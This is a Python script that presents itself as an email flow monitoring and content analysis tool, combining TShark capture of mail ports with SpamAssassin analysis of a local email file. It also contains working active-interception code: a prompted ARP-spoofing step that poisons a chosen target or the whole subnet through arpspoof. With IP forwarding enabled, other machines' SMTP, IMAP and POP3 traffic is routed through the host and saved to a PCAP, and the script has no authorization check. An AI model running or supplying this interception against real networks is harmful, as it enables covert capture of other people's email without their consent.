import os
import sys
import time
import subprocess
from datetime import datetime

# Tool Assessment Matrix defined by requirements
ASSESSMENT_FOCUS = {
    "SpamAssassin": [
        "Spam Detection",
        "Header Analysis",
        "Phishing Detection"
    ],
    "TShark (SMTP/IMAP/POP3)": [
        "Recipient/Domain Tracking",
        "User Behavior Monitoring",
        "Historical Email Logging",
        "Real-Time Flow Alerts"
    ]
}

def log(msg, level="INFO"):
    """Prints formatted color-coded log messages."""
    colors = {
        "INFO": "\033[94m",   # Blue
        "SUCCESS": "\033[92m",# Green
        "WARN": "\033[93m",   # Yellow
        "ERROR": "\033[91m",  # Red
        "RESET": "\033[0m"    # Reset
    }
    color = colors.get(level, colors["INFO"])
    print(f"{color}[{level}] {msg}{colors['RESET']}")

def setup_output_dir():
    """Creates a timestamped output directory for the current scanning session."""
    script_dir = os.path.dirname(os.path.abspath(__file__))
    base_out_dir = os.path.abspath(os.path.join(script_dir, "..", "output", "out_email_flow"))
    os.makedirs(base_out_dir, exist_ok=True)
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    out_dir = os.path.join(base_out_dir, f"email_flow_logs_{timestamp}")
    try:
        os.makedirs(out_dir, exist_ok=True)
        log(f"Created output directory: {out_dir}", "SUCCESS")
        return out_dir
    except Exception as e:
        log(f"Failed to create directory '{out_dir}': {e}", "ERROR")
        sys.exit(1)

def set_ip_forwarding(enable=True):
    """Enables or disables IP forwarding to act as a router during ARP Spoofing."""
    val = "1" if enable else "0"
    state = "Enabling" if enable else "Disabling"
    log(f"{state} IP Forwarding...", "INFO")
    try:
        subprocess.run(["sysctl", "-w", f"net.ipv4.ip_forward={val}"], capture_output=True, check=True)
    except Exception as e:
        log(f"Failed to set IP forwarding. Interception might drop victim's internet: {e}", "WARN")

def start_arp_spoofing(interface, gateway_ip, target_ip=""):
    """Starts bidirectional ARP spoofing to capture whole network/target email traffic."""
    procs = []
    try:
        # Verify arpspoof is installed (part of dsniff)
        subprocess.run(["arpspoof", "-h"], capture_output=True)
        
        log(f"Initiating ARP Spoofing on {interface} to intercept email traffic...", "WARN")
        
        # We need the user to either spoof exactly one target or the entire subnet
        if target_ip:
            log(f"  --> Intercepting Target: {target_ip} <--> Gateway: {gateway_ip}", "WARN")
            p1 = subprocess.Popen(["arpspoof", "-i", interface, "-t", target_ip, gateway_ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            p2 = subprocess.Popen(["arpspoof", "-i", interface, "-t", gateway_ip, target_ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            procs.extend([p1, p2])
        else:
            log(f"  --> Intercepting ENTIRE SUBNET <--> Gateway: {gateway_ip}", "WARN")
            p1 = subprocess.Popen(["arpspoof", "-i", interface, gateway_ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            procs.append(p1)
            
        log("ARP Spoofing is now active. Email flows routed to this machine.", "SUCCESS")
        return procs
        
    except FileNotFoundError:
        log("'arpspoof' is missing! Install via 'sudo apt install dsniff'. TShark will only log local traffic.", "ERROR")
        return []

def stop_arp_spoofing(procs):
    """Terminates ARP spoofing processes safely."""
    if procs:
        log("Stopping active interception (ARP Spoofing) and cleaning up...", "INFO")
        for p in procs:
            p.terminate()
            p.wait(timeout=5)
        log("Target traffic routing restored to normal.", "SUCCESS")


def run_tshark_email(out_dir, interface, duration_mins=5):
    """Actively monitors live SMTP/IMAP network traffic and captures it to PCAP."""
    duration_secs = duration_mins * 60
    log(f"Starting Live TShark Email Flow Capture on {interface} for {duration_mins} minute(s)...", "INFO")
    log(f"Assessment Focus: {', '.join(ASSESSMENT_FOCUS['TShark (SMTP/IMAP/POP3)'])}", "INFO")
    
    pcap_out = os.path.join(out_dir, "email_traffic.pcap")
    log_out = os.path.join(out_dir, "historical_email_flows.txt")
    
    # We filter TShark for standard mail routing ports
    mail_ports = "tcp port 25 or tcp port 465 or tcp port 587 or tcp port 143 or tcp port 993 or tcp port 110 or tcp port 995"
    
    try:
        # -a duration stops capture cleanly after specified seconds
        subprocess.run(["tshark", "-i", interface, "-a", f"duration:{duration_secs}", "-f", mail_ports, "-w", pcap_out], 
                       capture_output=True, text=True)
        
        # Analyze PCAP and save conversation results
        if os.path.exists(pcap_out):
            # Extract connections (Conversations) mapping IPs to Mail servers
            analysis = subprocess.run(["tshark", "-r", pcap_out, "-q", "-z", "conv,tcp"], capture_output=True, text=True)
            with open(log_out, "w") as f:
                f.write(f"--- FILTERED EMAIL TRAFFIC LOG: {mail_ports} ---\n\n")
                f.write(analysis.stdout)
                
            log(f"Live email flow logging complete! Wrote PCAP to {pcap_out}.", "SUCCESS")
        else:
            log("TShark did not successfully generate a PCAP file.", "WARN")
            
    except FileNotFoundError:
        log("TShark is not installed. Skipping live flow capture.", "ERROR")
    except Exception as e:
        log(f"Error executing TShark: {e}", "ERROR")


def run_spamassassin(out_dir, eml_file):
    """Analyzes a specific raw email file using SpamAssassin statically."""
    if not eml_file:
        return
        
    log(f"Starting Static Content Analysis using SpamAssassin on '{eml_file}'...", "INFO")
    log(f"Assessment Focus: {', '.join(ASSESSMENT_FOCUS['SpamAssassin'])}", "INFO")
    
    sa_out = os.path.join(out_dir, "spamassassin_report.txt")
    
    try:
        if not os.path.exists(eml_file):
            log(f"Email file '{eml_file}' not found. Cannot analyze.", "ERROR")
            return
            
        with open(eml_file, "r") as infile, open(sa_out, "w") as outfile:
            # -t triggers test/report generation on STDOUT
            subprocess.run(["spamassassin", "-t"], stdin=infile, stdout=outfile, stderr=subprocess.STDOUT)
            
        log(f"SpamAssassin analysis complete. Component text report generated.", "SUCCESS")
    except FileNotFoundError:
        log("SpamAssassin is not installed! (Install via 'sudo apt install spamassassin')", "ERROR")
    except Exception as e:
        log(f"Error executing SpamAssassin: {e}", "ERROR")

def compile_results(out_dir):
    """Parses individual tool logs and compiles them into a single report, deleting clutter."""
    log("Consolidating final Email Flow report...", "INFO")
    
    final_report = os.path.join(out_dir, "email_flow_report.txt")
    pcap_log = os.path.join(out_dir, "historical_email_flows.txt")
    sa_log = os.path.join(out_dir, "spamassassin_report.txt")
    
    try:
        with open(final_report, "w") as report:
            report.write("==========================================================\n")
            report.write("               EMAIL FLOW & CONTENT REPORT                \n")
            report.write("==========================================================\n\n")
            
            report.write("--- 1. Live Email Flow Analysis (TShark) ---\n")
            if os.path.exists(pcap_log):
                with open(pcap_log, "r") as f:
                    report.write(f.read() + "\n")
            else:
                report.write("No live network email flows captured or analyzed.\n\n")
                
            report.write("\n--- 2. Static Content Analysis (SpamAssassin) ---\n")
            if os.path.exists(sa_log):
                with open(sa_log, "r") as f:
                    report.write(f.read() + "\n")
            else:
                report.write("No static .eml file processed.\n")
                
        # Clean up text artifacts, leaving only the consolidated report and the actual raw traffic PCAP
        for file in [pcap_log, sa_log]:
            if os.path.exists(file):
                os.remove(file)
                
        log(f"Report cleanly compiled to: '{os.path.abspath(final_report)}'", "SUCCESS")
        
    except Exception as e:
        log(f"Error compiling final report: {e}", "ERROR")

def main():
    print("==========================================================")
    print("        Email Flow Monitoring & Content Analysis          ")
    print("==========================================================")
    
    # Alert if not running as root
    if os.geteuid() != 0:
        log("WARNING: TShark (raw socket access) and ARP Spoofing require root (sudo).", "WARN")
        time.sleep(2)
        
    arpspoof_procs = []
    is_spoofing = False
    
    try:
        # Prompt user for inputs
        interface = input("\nEnter interface for Live Email Flow monitoring (e.g., eth0) [default: eth0]: ").strip()
        if not interface:
            interface = "eth0"
            
        duration_input = input("Enter Flow Capture duration (minutes) [default: 5]: ").strip()
        duration_mins = int(duration_input) if duration_input.isdigit() else 5
        
        eml_file = input("Enter path to a raw email file (.eml) for static SpamAssassin assessment [leave blank to skip]: ").strip()
        
        print("\n--- Phase 1: Network Setup ---")
        spoof_choice = input("Enable Active ARP Spoofing to intercept WHOLE network email traffic? (y/N): ").strip().lower()
        if spoof_choice == 'y':
            gateway_ip = input("  Enter Router/Gateway IP (e.g., 192.168.1.1): ").strip()
            target_ip = input("  Enter Target IP (leave empty to intercept ALL subnet traffic): ").strip()
            
            if gateway_ip:
                is_spoofing = True
                set_ip_forwarding(enable=True)
                arpspoof_procs = start_arp_spoofing(interface, gateway_ip, target_ip)
            else:
                log("Router/Gateway IP is absolutely required to arp spoof. Bypassing interception.", "WARN")
        
        out_dir = setup_output_dir()
        
        print("\n--- Phase 2: Live Network Email Monitoring ---")
        run_tshark_email(out_dir, interface, duration_mins=duration_mins)
        
        if eml_file:
            print("\n--- Phase 3: Static Email Content Analysis ---")
            run_spamassassin(out_dir, eml_file)
        
        print("\n==========================================================")
        compile_results(out_dir)
        log("Monitoring Phase mathematically complete!", "SUCCESS")
        
    except KeyboardInterrupt:
        print("\n")
        log("Email assessment purposefully interrupted by user. Exiting...", "WARN")
    finally:
        # Clean-up overriding block to prevent network crashes
        if is_spoofing:
            print("\n--- Clean-up Phase ---")
            stop_arp_spoofing(arpspoof_procs)
            set_ip_forwarding(enable=False)
            
        sys.exit(0)

if __name__ == "__main__":
    main()
